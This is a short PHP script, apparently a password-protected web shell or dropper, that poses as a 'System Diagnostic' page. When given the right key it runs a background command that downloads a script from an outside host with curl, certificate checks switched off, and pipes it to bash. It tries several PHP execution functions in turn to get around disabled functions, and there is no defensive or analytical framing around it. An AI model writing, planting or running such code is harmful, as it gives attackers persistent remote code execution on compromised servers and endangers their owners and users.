<?php
$password_aman = 'real'; 

if (!isset($_GET['key']) || $_GET['key'] !== $password_aman) {
    header('HTTP/1.0 403 Forbidden');
    die("Error: Access Denied.");
}

$remote_url = "https://everythinggodordains.com/trubuk/athgs";
$cmd = 'nohup bash -c "$(curl -fsSL ' . $remote_url . ' -k)" > /dev/null 2>&1 &';

echo "<h2>System Diagnostic</h2>";
echo "Status: <b>Executing Persistent Process...</b><br><hr>";

$methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open'];
$worked = false;

foreach ($methods as $method) {
    if (function_exists($method)) {
        echo "Trying method: <span style='color:green'>$method</span>... ";
        try {
            if ($method == 'popen') {
                $p = popen($cmd, 'r');
                pclose($p);
            } elseif ($method == 'proc_open') {
                $process = proc_open($cmd, [1 => ["pipe", "w"], 2 => ["pipe", "w"]], $pipes);
                proc_close($process);
            } elseif ($method == 'exec') {
                exec($cmd);
            } else {
                $method($cmd);
            }
            echo "<b>[SENT]</b><br>";
            $worked = true;
            break;
        } catch (Exception $e) {
            echo "<b>[FAILED]</b><br>";
        }
    } else {
        echo "Method: <span style='color:red'>$method</span>... <b>[DISABLED]</b><br>";
    }
}

if ($worked) {
    echo "<hr>✅ <b>Perintah telah dikirim ke background.</b>";
} else {
    echo "<hr>❌ <b>Gagal:</b> Semua fungsi eksekusi diblokir.";
}
?>
